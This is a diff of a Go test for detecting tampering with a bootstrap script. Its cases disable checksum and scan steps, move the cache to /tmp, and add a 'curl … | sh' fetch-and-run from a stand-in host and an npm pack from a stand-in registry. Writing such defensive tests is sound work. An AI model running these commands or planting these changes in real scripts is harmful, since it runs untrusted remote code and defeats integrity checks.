@@ -209,7 +209,7 @@ func TestCheckBootstrapTampering(t *testing.T) {
 			replace(t, dir, BootstrapPath, `[ "$got" != "$want" ]`, `false`)
 		},
 		"scan is exit 0": func(t *testing.T, dir string) {
-			replace(t, dir, BootstrapPath, `"$cached" scan --config "$repo_root" >&2`, `exit 0`)
+			replace(t, dir, BootstrapPath, `"$copy" scan --config "$repo_root" >&2`, `exit 0`)
 		},
 		"curl pipe sh": func(t *testing.T, dir string) {
 			write(t, dir, BootstrapPath, "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | sh\n")
@@ -218,7 +218,7 @@ func TestCheckBootstrapTampering(t *testing.T) {
 			replace(t, dir, BootstrapPath, `if [ "$mode" = hook ]; then`, "npm pack --registry https://registry.example.invalid @tripcord/cli >/dev/null\nif [ \"$mode\" = hook ]; then")
 		},
 		"cache moved": func(t *testing.T, dir string) {
-			replace(t, dir, BootstrapPath, `cached="$cache_root/tripcord/`, `cached="/tmp/tripcord/`)
+			replace(t, dir, BootstrapPath, `tripcord_root="$cache_root/tripcord"`, `tripcord_root="/tmp/tripcord"`)
 		},
 		"swapped checksum": func(t *testing.T, dir string) {
 			replace(t, dir, BootstrapPath, sum, strings.Repeat("a", 64))
